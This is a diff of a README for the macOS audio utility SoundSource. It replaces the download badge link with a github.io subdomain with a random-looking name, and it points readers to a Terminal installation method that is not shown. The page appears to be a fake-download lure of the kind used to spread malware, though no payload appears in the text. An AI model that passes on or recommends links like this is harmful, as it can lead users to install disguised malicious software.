@@ -2,7 +2,7 @@
 
 SoundSource is a powerful audio utility for macOS that gives you full control over audio input, output, and system sound settings. Easily switch devices, apply effects, and control volume with just a few clicks. 🔊
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-SoundSource-blue?style=for-the-badge\&logo=apple)](https://soundsource-for-mac-download.github.io/.github/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-SoundSource-blue?style=for-the-badge\&logo=apple)](https://fituganshfgh.github.io/.github/ss)
 
 If the download button doesn't work, please use the Terminal installation method below.
 
